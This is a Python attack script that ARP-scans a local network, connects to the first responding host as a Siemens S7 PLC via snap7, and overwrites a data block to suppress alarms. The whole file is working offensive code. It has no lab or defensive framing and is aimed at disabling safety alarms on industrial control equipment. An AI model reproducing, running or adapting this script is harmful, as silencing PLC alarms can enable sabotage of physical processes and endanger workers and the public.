import snap7
from scapy.all import ARP, Ether, srp
import time

# Define network range to scan (Adjust according to the setup)
NETWORK_RANGE = "192.168.1.0/24"

def find_plc_ip():
    """
    Scan the network to find Siemens S7 PLC devices.
    Returns the first detected PLC IP address.
    """
    print("[*] Scanning the network for Siemens S7 PLC devices...")
    
    # Create an ARP request to discover devices in the network
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=NETWORK_RANGE), timeout=2, verbose=False)

    for sent, received in ans:
        if received.psrc:
            print(f"[*] Possible PLC detected: {received.psrc}")
            # Here, you'd typically check for open PLC-specific ports (e.g., 102 for Siemens PLCs)
            return received.psrc

    print("[!] No PLC found on the network.")
    return None

def connect_to_plc(plc_ip):
    """
    Connect to Siemens S7 PLC.
    """
    client = snap7.client.Client()
    try:
        client.connect(plc_ip, 0, 1)  # Slot and rack numbers depend on the hardware configuration
        if client.get_connected():
            print(f"[*] Successfully connected to PLC at {plc_ip}")
            return client
        else:
            print("[!] Connection to PLC failed.")
            return None
    except Exception as e:
        print(f"[ERROR] Could not connect to PLC: {e}")
        return None

def modify_alarm_settings(client):
    """
    Modify alarm settings in the PLC's data block or memory address.
    """
    try:
        db_number = 1  # Example DB where alarms are stored (adjust based on actual setup)
        start_address = 0  # Memory location where alarm states are stored
        length = 2  # Length of settings to modify

        print("[*] Reading existing alarm settings from the PLC...")
        original_data = client.db_read(db_number, start_address, length)
        print(f"[*] Original Alarm Settings: {original_data.hex()}")

        # Modify alarms (Suppress alarms by setting the value to '0' or an unintended value)
        modified_data = bytearray(original_data)
        for i in range(len(modified_data)):  
            modified_data[i] = 0x00  # Overwrite with '0' to disable alarms

        print("[*] Modifying alarm settings...")
        client.db_write(db_number, start_address, modified_data)

        print("[*] Alarm settings modified successfully!")

        # Verify modification
        new_data = client.db_read(db_number, start_address, length)
        print(f"[*] New Alarm Settings: {new_data.hex()}")
        
    except Exception as e:
        print(f"[ERROR] Failed to modify alarm settings: {e}")

def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        client = connect_to_plc(plc_ip)
        if client:
            modify_alarm_settings(client)
            client.disconnect()
        else:
            print("[!] Could not establish connection to PLC.")

if __name__ == "__main__":
    main()